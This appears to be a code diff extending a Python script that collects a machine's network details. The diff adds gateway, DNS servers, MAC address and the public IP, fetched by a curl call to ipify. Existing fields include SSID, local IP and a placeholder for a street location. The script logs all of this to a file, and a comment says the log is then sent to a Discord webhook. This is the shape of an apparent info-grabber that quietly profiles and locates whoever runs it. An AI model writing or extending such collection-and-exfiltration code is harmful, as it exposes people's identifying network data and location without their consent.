@@ -38,7 +38,8 @@ def get_network_info():
 def get_wifi_details():
     ssid = execute_command('iwgetid -r')
     signal_strength = execute_command('iwconfig 2>&1 | grep Signal | cut -d "=" -f 3 | cut -d " " -f 1')
-    street = ''  # Placeholder for street name - not directly available via standard commands
+    # Placeholder for street name - not directly available via standard commands
+    street = ''  
 
     return {
         'ssid': ssid,
@@ -46,9 +47,28 @@ def get_wifi_details():
         'street': street,
     }
 
+# Function to get public IP address
+def get_public_ip():
+    ip = execute_command('curl -s https://api64.ipify.org')
+    return ip
+
+# Function to get detailed network information
+def get_detailed_network_info():
+    gateway = execute_command('ip route | grep default | awk \'/default/ {print $3}\'')
+    dns_servers = execute_command('cat /etc/resolv.conf | grep nameserver | awk \'{print $2}\'')
+    mac_address = execute_command('cat /sys/class/net/wlan0/address')
+
+    return {
+        'gateway': gateway,
+        'dns_servers': dns_servers,
+        'mac_address': mac_address,
+    }
+
 # Collect detailed network and WiFi information
 wlan_info = get_network_info()
 wifi_details = get_wifi_details()
+network_info = get_detailed_network_info()
+public_ip = get_public_ip()
 
 # Write collected information to log.txt
 with open('log.txt', 'w') as f:
@@ -57,8 +77,12 @@ with open('log.txt', 'w') as f:
     f.write(f"IP Address: {wlan_info['addr']}\n")
     f.write(f"Netmask: {wlan_info['netmask']}\n")
     f.write(f"Broadcast Address: {wlan_info['broadcast']}\n")
+    f.write(f"Gateway: {network_info['gateway']}\n")
+    f.write(f"DNS Servers: {network_info['dns_servers']}\n")
+    f.write(f"MAC Address: {network_info['mac_address']}\n")
     f.write(f"SSID: {wifi_details['ssid']}\n")
     f.write(f"Signal Strength: {wifi_details['signal_strength']} dBm\n")
+    f.write(f"Public IP Address: {public_ip}\n")
     f.write(f"Street: {wifi_details['street']}\n\n")
 
 # Send log.txt content to Discord webhook
